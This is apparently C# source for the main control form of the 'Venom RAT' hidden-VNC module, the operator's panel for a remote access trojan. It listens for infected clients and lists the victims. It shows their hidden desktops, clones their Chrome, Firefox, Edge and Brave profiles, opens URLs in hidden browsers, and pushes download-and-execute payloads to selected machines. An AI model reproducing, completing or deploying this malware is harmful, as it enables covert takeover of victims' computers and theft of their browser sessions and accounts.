using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace VenomRAT_HVNC.HVNC
{
    public partial class FrmMain : Form
    {
        private int _port { get; set; }
        public FrmMain(int port)
        {
            this._port = port;
            this.InitializeComponent();
        }

        public void Listenning()
        {
            checked
            {
                try
                {
                    _clientList = new List<TcpClient>();
                    _TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(hvncport.Text));
                    _TcpListener.Start();
                    _TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
                }
                catch (Exception ex)
                {
                    try
                    {
                        if (ex.Message.Contains("aborted"))
                        {
                            return;
                        }
                        IEnumerator enumerator = null;
                        while (true)
                        {
                            try
                            {
                                try
                                {
                                    enumerator = Application.OpenForms.GetEnumerator();
                                    while (enumerator.MoveNext())
                                    {
                                        Form form = (Form)enumerator.Current;
                                        if (form.Name.Contains("FrmVNC"))
                                        {
                                            form.Dispose();
                                        }
                                    }
                                }
                                finally
                                {
                                    if (enumerator is IDisposable)
                                    {
                                        (enumerator as IDisposable).Dispose();
                                    }
                                }
                            }
                            catch (Exception)
                            {
                                continue;
                            }
                            break;
                        }
                        bool_1 = false;
                        HVNCListenBtn.Text = "Listen";
                        int num = _clientList.Count - 1;
                        for (int i = 0; i <= num; i++)
                        {
                            _clientList[i].Close();
                        }
                        _clientList = new List<TcpClient>();
                        int_2 = 0;
                        _TcpListener.Stop();
                        ClientsOnline.Text = "Clients Online: 0";
                    }
                    catch (Exception)
                    {
                    }
                }
            }
        }

        public static string RandomNumber(int length)
        {
            return new string((from s in Enumerable.Repeat("0123456789", length)
                               select s[random.Next(s.Length)]).ToArray());
        }

        public void ResultAsync(IAsyncResult iasyncResult_0)
        {
            try
            {
                TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
                tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
                _TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
            }
            catch (Exception)
            {
            }
        }

        public void ReadResult(IAsyncResult iasyncResult_0)
        {
            TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
            checked
            {
                try
                {
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                    binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                    binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                    byte[] array = new byte[8];
                    int num = 8;
                    int num2 = 0;
                    while (num > 0)
                    {
                        int num3 = tcpClient.GetStream().Read(array, num2, num);
                        num -= num3;
                        num2 += num3;
                    }
                    ulong num4 = BitConverter.ToUInt64(array, 0);
                    int num5 = 0;
                    byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        int num6 = 0;
                        int num7 = array2.Length;
                        while (num7 > 0)
                        {
                            num5 = tcpClient.GetStream().Read(array2, num6, num7);
                            num7 -= num5;
                            num6 += num5;
                        }
                        memoryStream.Write(array2, 0, (int)num4);
                        memoryStream.Position = 0L;
                        object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
                        if (objectValue is string)
                        {
                            string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
                            try
                            {
                                if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
                                {
                                    tcpClient.Close();
                                }
                                if (Operators.CompareString(array3[0], "654321", TextCompare: false) == 0)
                                {
                                    string text;
                                    try
                                    {
                                        text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                                    }
                                    catch
                                    {
                                        text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                                    }
                                    try
                                    {
                                        long num8 = 0L;
                                        IPAddress address = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address;
                                        string text2 = new Ping().Send(address).RoundtripTime.ToString();
                                        ListViewItem lvi2 = new ListViewItem(new string[10]
                                        {
                                            " " + text,
                                            array3[1].Replace(" ", null),
                                            array3[3],
                                            array3[2],
                                            array3[4],
                                            array3[6],
                                            array3[5],
                                            array3[7],
                                            array3[8],
                                            text2
                                        })
                                        {
                                            Tag = tcpClient,
                                            ImageKey = array3[3].ToString() + ".png"
                                        };
                                        HVNCList.Invoke((MethodInvoker)delegate
                                        {
                                            lock (_clientList)
                                            {
                                                HVNCList.Items.Add(lvi2);
                                                HVNCList.Items[int_2].Selected = true;
                                                _clientList.Add(tcpClient);
                                                int_2++;
                                                ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
                                                GC.Collect();
                                            }
                                        });
                                    }
                                    catch (Exception)
                                    {
                                        ListViewItem lvi = new ListViewItem(new string[10]
                                        {
                                            " " + text,
                                            array3[1].Replace(" ", null),
                                            array3[3],
                                            array3[2],
                                            array3[4],
                                            array3[6],
                                            array3[5],
                                            array3[7],
                                            array3[8],
                                            "N/A"
                                        })
                                        {
                                            Tag = tcpClient,
                                            ImageKey = array3[3].ToString() + ".png"
                                        };
                                        HVNCList.Invoke((MethodInvoker)delegate
                                        {
                                            lock (_clientList)
                                            {
                                                HVNCList.Items.Add(lvi);
                                                HVNCList.Items[int_2].Selected = true;
                                                _clientList.Add(tcpClient);
                                                int_2++;
                                                ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
                                                GC.Collect();
                                            }
                                        });
                                    }
                                }
                                else if (_clientList.Contains(tcpClient))
                                {
                                    GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
                                }
                                else
                                {
                                    tcpClient.Close();
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                        else if (_clientList.Contains(tcpClient))
                        {
                            GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
                        }
                        else
                        {
                            tcpClient.Close();
                        }
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                    tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
                }
                catch (Exception ex3)
                {
                    if (!ex3.Message.Contains("disposed"))
                    {
                        try
                        {
                            if (!_clientList.Contains(tcpClient))
                            {
                                return;
                            }
                            int NumberReceived;
                            for (NumberReceived = Application.OpenForms.Count - 2; NumberReceived >= 0; NumberReceived += -1)
                            {
                                if (Application.OpenForms[NumberReceived] == null || Application.OpenForms[NumberReceived].Tag != tcpClient)
                                {
                                    continue;
                                }
                                if (Application.OpenForms[NumberReceived].Visible)
                                {
                                    Invoke((MethodInvoker)delegate
                                    {
                                        if (Application.OpenForms[NumberReceived].IsHandleCreated)
                                        {
                                            Application.OpenForms[NumberReceived].Close();
                                        }
                                    });
                                }
                                else if (Application.OpenForms[NumberReceived].IsHandleCreated)
                                {
                                    Application.OpenForms[NumberReceived].Close();
                                }
                            }
                            HVNCList.Invoke((MethodInvoker)delegate
                            {
                                lock (_clientList)
                                {
                                    try
                                    {
                                        int index = _clientList.IndexOf(tcpClient);
                                        _clientList.RemoveAt(index);
                                        HVNCList.Items.RemoveAt(index);
                                        tcpClient.Close();
                                        int_2--;
                                        ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
                                    }
                                    catch (Exception)
                                    {
                                    }
                                }
                            });
                        }
                        catch (Exception)
                        {
                        }
                    }
                    else
                    {
                        tcpClient.Close();
                    }
                }
            }
        }

        public void GetStatus(object object_2, TcpClient tcpClient_0)
        {
            int hashCode = tcpClient_0.GetHashCode();
            FrmVNC frmVNC = (FrmVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
            if (object_2 is Bitmap)
            {
                frmVNC.VNCBoxe.Image = (Image)object_2;
            }
            else
            {
                if (!(object_2 is string))
                {
                    return;
                }
                string[] array = Conversions.ToString(object_2).Split('|');
                string left = array[0];
                if (Operators.CompareString(left, "0", TextCompare: false) == 0)
                {
                    frmVNC.VNCBoxe.Tag = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
                }
                if (Operators.CompareString(left, "200", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated with cloned profile successfully!";
                }
                if (Operators.CompareString(left, "201", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated successfully!";
                }
                if (Operators.CompareString(left, "202", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated with cloned profile successfully!";
                }
                if (Operators.CompareString(left, "203", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated successfully!";
                }
                if (Operators.CompareString(left, "204", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated with cloned profile successfully!";
                }
                if (Operators.CompareString(left, "205", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated successfully!";
                }
                if (Operators.CompareString(left, "206", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave initiated with cloned profile successfully!";
                }
                if (Operators.CompareString(left, "207", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
                }
                if (Operators.CompareString(left, "256", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
                }
                if (Operators.CompareString(left, "22", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.int_0 = Conversions.ToInteger(array[1]);
                    frmVNC.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(array[1]);
                }
                if (Operators.CompareString(left, "23", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(array[1]));
                }
                if (Operators.CompareString(left, "24", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = "Copy successfully !";
                }
                if (Operators.CompareString(left, "25", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "26", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                Operators.CompareString(left, "719", TextCompare: false);
                if (Operators.CompareString(left, "2555", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "2556", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "2557", TextCompare: false) == 0)
                {
                    frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
                }
                if (Operators.CompareString(left, "3307", TextCompare: false) == 0)
                {
                    Clipboard.SetText(array[1].ToString());
                }
            }
        }


        private void HVNCList_DoubleClick(object sender, EventArgs e)
        {
            checked
            {
                try
                {
                    if (HVNCList.SelectedItems.Count == 0)
                    {
                        MessageBox.Show("You have to select a client first!", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    }
                    else if (HVNCList.FocusedItem.Index != -1)
                    {
                        for (int i = Application.OpenForms.Count - 1; i >= 0; i += -1)
                        {
                            if (Application.OpenForms[i].Tag == FrmMain._clientList[HVNCList.FocusedItem.Index])
                            {
                                Application.OpenForms[i].Show();
                                return;
                            }
                        }
                        FrmVNC frmVNC = new FrmVNC();
                        frmVNC.Name = "VNCForm:" + Conversions.ToString(FrmMain._clientList[HVNCList.FocusedItem.Index].GetHashCode());
                        frmVNC.Tag = FrmMain._clientList[HVNCList.FocusedItem.Index];
                        string text = this.HVNCList.FocusedItem.SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                            .Replace("}", null)
                            .Replace(":", null)
                            .Remove(0, 1);
                        frmVNC.Show();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("You have to select a client first!", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
            }
        }

        private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void HVNCList_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            if (!e.Item.Selected)
            {
                e.DrawDefault = true;
            }
        }

        private void HVNCList_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            if (e.Item.Selected)
            {
                e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(50, 50, 50)), e.Bounds);
                TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point), checked(new Point(e.Bounds.Left + 3, e.Bounds.Top + 2)), Color.White);
                return;
            }
            e.DrawDefault = true;
        }

        private void HVNCListenBtn_Click_1(object sender, EventArgs e)
        {
            if (Operators.CompareString(PortStatus.Text, "Start Port", TextCompare: false) == 0)
            {
                PortStatus.Text = "Disable Port";
                HVNCListenPort.Enabled = false;
                VNC_Thread = new Thread(Listenning)
                {
                    IsBackground = true
                };
                bool_1 = true;
                VNC_Thread.Start();
                return;
            }
            IEnumerator enumerator = null;
            while (true)
            {
                try
                {
                    try
                    {
                        enumerator = Application.OpenForms.GetEnumerator();
                        while (enumerator.MoveNext())
                        {
                            Form form = (Form)enumerator.Current;
                            if (form.Name.Contains("FrmVNC"))
                            {
                                form.Dispose();
                            }
                        }
                    }
                    finally
                    {
                        if (enumerator is IDisposable)
                        {
                            (enumerator as IDisposable).Dispose();
                        }
                    }
                }
                catch (Exception)
                {
                    continue;
                }
                break;
            }
            HVNCListenPort.Enabled = true;
            if (VNC_Thread != null)
                VNC_Thread.Abort();
            bool_1 = false;
            PortStatus.Text = "Start Port";
            HVNCList.Items.Clear();
            _TcpListener.Stop();
            checked
            {
                int num = _clientList.Count - 1;
                for (int i = 0; i <= num; i++)
                {
                    _clientList[i].Close();
                }
                _clientList = new List<TcpClient>();
                int_2 = 0;
                ClientsOnline.Text = "Clients Online: 0";
            }
        }




        private void FrmMain_Load(object sender, EventArgs e)
        {
            hvncport.Value = _port;
            HVNCList.View = View.Details;
            HVNCList.HideSelection = false;
            HVNCList.OwnerDraw = true;
            HVNCList.BackColor = Color.FromArgb(24, 24, 24);
            HVNCList.DrawColumnHeader += delegate (object sender1, DrawListViewColumnHeaderEventArgs args)
            {
                Brush brush = new SolidBrush(Color.FromArgb(8, 104, 81));
                args.Graphics.FillRectangle(brush, args.Bounds);
                TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
            };
            HVNCList.DrawItem += delegate (object sender1, DrawListViewItemEventArgs args)
            {
                args.DrawDefault = true;
            };
            HVNCList.DrawSubItem += delegate (object sender1, DrawListViewSubItemEventArgs args)
            {
                args.DrawDefault = true;
            };
            ClientsOnline.Text = "Clients Online: 0";
        }

        private void FrmMain_FormClosed(object sender, FormClosedEventArgs e)
        {
            Environment.Exit(Environment.ExitCode);
        }

        public static string saveurl { get; set; }

        private void visitURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (HVNCList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a client first! ", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    return;
                }
                new FrmURL().ShowDialog();
                if (!ispressed)
                {
                    return;
                }
                FrmVNC frmVNC = new FrmVNC();
                foreach (object selectedItem in HVNCList.SelectedItems)
                {
                    _ = selectedItem;
                    count = HVNCList.SelectedItems.Count;
                }
                for (int i = 0; i < count; i++)
                {
                    frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                    object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                    frmVNC.hURL(saveurl);
                    frmVNC.Dispose();
                }
                MessageBox.Show("Operation Completed To Selected Clients: " + count, "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                ispressed = false;
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
                Close();
            }
        }



        private void killChromeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmVNC frmVNC = new FrmVNC();
            foreach (object selectedItem in HVNCList.SelectedItems)
            {
                _ = selectedItem;
                count = HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                frmVNC.KillChrome();
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + count, "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }


        private void resetScaleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmVNC frmVNC = new FrmVNC();
            foreach (object selectedItem in HVNCList.SelectedItems)
            {
                _ = selectedItem;
                count = HVNCList.SelectedItems.Count;
            }
            for (int i = 0; i < count; i++)
            {
                frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
                object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
                frmVNC.ResetScale();
                frmVNC.Dispose();
            }
            MessageBox.Show("Operation Completed To Selected Clients: " + count, "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }


        public static string MassURL { get; set; }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmBuilder frmBuilder = new FrmBuilder(Convert.ToInt32(_port));
            frmBuilder.ShowDialog();
        }

        private void TogglePort_Click(object sender, EventArgs e)
        {
            if (Operators.CompareString(PortStatus.Text, "Start Port", TextCompare: false) == 0)
            {
                PortStatus.Text = "Disable Port";
                HVNCListenPort.Enabled = false;
                VNC_Thread = new Thread(Listenning)
                {
                    IsBackground = true
                };
                bool_1 = true;
                VNC_Thread.Start();
                return;
            }
            IEnumerator enumerator = null;
            while (true)
            {
                try
                {
                    try
                    {
                        enumerator = Application.OpenForms.GetEnumerator();
                        while (enumerator.MoveNext())
                        {
                            Form form = (Form)enumerator.Current;
                            if (form.Name.Contains("FrmVNC"))
                            {
                                form.Dispose();
                            }
                        }
                    }
                    finally
                    {
                        if (enumerator is IDisposable)
                        {
                            (enumerator as IDisposable).Dispose();
                        }
                    }
                }
                catch (Exception)
                {
                    continue;
                }
                break;
            }
            HVNCListenPort.Enabled = true;
            if (VNC_Thread != null)
                VNC_Thread.Abort();
            bool_1 = false;
            PortStatus.Text = "Start Port";
            HVNCList.Items.Clear();
            _TcpListener.Stop();
            checked
            {
                int num = _clientList.Count - 1;
                for (int i = 0; i <= num; i++)
                {
                    _clientList[i].Close();
                }
                _clientList = new List<TcpClient>();
                int_2 = 0;
                ClientsOnline.Text = "Clients Online: 0";
            }
        }

        private void remoteExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.HVNCList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a client first! ", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {
                    FrmMassUpdate frmMassUpdate = new FrmMassUpdate();
                    frmMassUpdate.ShowDialog();
                    if (FrmMain.ispressed)
                    {
                        FrmVNC frmVNC = new FrmVNC();
                        foreach (object obj in this.HVNCList.SelectedItems)
                        {
                            this.count = this.HVNCList.SelectedItems.Count;
                        }
                        for (int i = 0; i < this.count; i++)
                        {
                            frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
                            object tag = this.HVNCList.SelectedItems[i].Tag;
                            frmVNC.Tag = tag;
                            frmVNC.UpdateClient(FrmMain.MassURL);
                            frmVNC.Dispose();
                        }
                        MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                        FrmMain.ispressed = false;
                    }
                }
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                base.Close();
            }
        }

        private void closeConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.HVNCList.SelectedItems.Count == 0)
                {
                    MessageBox.Show("You have to select a client first! ", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {
                    DialogResult dialogResult = MessageBox.Show("Are you sure you want to close the connection?", "Venom RAT", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
                    if (dialogResult == DialogResult.Yes)
                    {
                        FrmVNC frmVNC = new FrmVNC();
                        foreach (object obj in this.HVNCList.SelectedItems)
                        {
                            this.count = this.HVNCList.SelectedItems.Count;
                        }
                        for (int i = 0; i < this.count; i++)
                        {
                            frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
                            object tag = this.HVNCList.SelectedItems[i].Tag;
                            frmVNC.Tag = tag;
                            frmVNC.CloseClient();
                            frmVNC.Dispose();
                        }
                        MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    }
                }
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                base.Close();
            }
        }

        public static List<TcpClient> _clientList;

        public static TcpListener _TcpListener;

        private Thread VNC_Thread;

        public static int SelectClient;

        public static bool bool_1;

        public static int int_2;

        public static string isadmin;

        public static string detecav;

        public static Random random = new Random();

        public int count;

        public static bool ispressed = false;

        private void TogglePort_CheckedChanged(object sender, EventArgs e)
        {
            if (TogglePort.Checked)
            {
                hvncport.Enabled = false;
            }
            else if (!TogglePort.Checked)
            {
                hvncport.Enabled = true;
            }
        }
    }
}
